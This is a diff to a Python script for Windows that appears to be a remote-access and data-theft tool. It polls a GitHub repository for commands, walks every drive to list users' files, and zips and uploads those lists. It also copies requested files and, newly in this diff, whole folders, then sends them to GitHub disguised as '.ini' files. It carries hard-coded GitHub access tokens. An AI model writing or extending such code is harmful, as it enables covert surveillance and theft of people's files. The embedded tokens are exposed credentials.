@@ -1,6 +1,6 @@
 from datetime import datetime
 from os import  fsync, listdir, environ , path , system , mkdir , walk , chdir , getcwd , remove
-from shutil import move , copy
+from shutil import move , copy , copytree
 from time import sleep
 from github import Github
 import base64
@@ -13,7 +13,7 @@ import win32api
 import zipfile
 
 # _____(end import)_____ #
-TOKEN = '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'
+TOKEN = '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'
 chdir(getcwd())
 # _____(function)_____ #
 try:
@@ -135,17 +135,29 @@ while True:
                 send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
 
             elif result_condition == "scan_system":
+                if not path.exists("path"):
+                    mkdir("path")
+                else:
+                    system("rmdir /s /q path")
+                    mkdir("path")
                 drives = win32api.GetLogicalDriveStrings()
                 drives = drives.split('\000')[:-1]
                 for i in drives:
                     if i == "C:\\": i = i + "Users"
-                    with open(f"{list(i)[0]}.ini", mode="w+", encoding="utf8") as f:
+                    print(i)
+                    with open(f"path\\{list(i)[0]}.ini", mode="w+", encoding="utf8") as f:
                         for root, dirs, files in walk(i):
                             for file in files:
                                 f.write(f"{path.join(root, file)}" + "\n")
-                    with open(f"{list(i)[0]}.ini", mode="r", encoding="utf8") as f:
-                        send_main_information(TOKEN=TOKEN, content=f.read(), name_file_to_site=f"{list(i)[0]}.ini")
-                    remove(f"{list(i)[0]}.ini")
+                create_zip_from_folder(folder_path="path", zip_filename="path.zip")
+                with open("path.zip", "rb") as f:
+                    with open("path.ini", "wb") as r:
+                        r.write(f.read())
+                        with open("path.ini", "rb") as f:
+                            send_file_to_git(TOKEN=TOKEN, content=f.read(), name_file_to_site="scan_path.ini")
+                remove_path = ["path.zip", "path.ini"]
+                for i in remove_path:
+                    remove(i)
                 send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
                 Rmpydir()
                 send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
@@ -157,8 +169,10 @@ while True:
                     if not path.exists('file'): mkdir("file")
                     if len(path_file) != 0:
                         for i in path_file:
-                            if path.exists(i):
+                            if path.isfile(i):
                                 copy(i, r"file")
+                            elif path.isdir(i):
+                                copytree(i , r"file")
                         create_zip_from_folder("file", "file.zip")
                         with open("file.zip", "rb") as f:
                             with open("file.ini", "wb") as r:
@@ -175,6 +189,7 @@ while True:
             else:
                 send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini") # last_visit(TOKEN)
                 sleep(300)
-    except:
+    except Exception as e:
+        print(e)
         sleep(5)
         continue
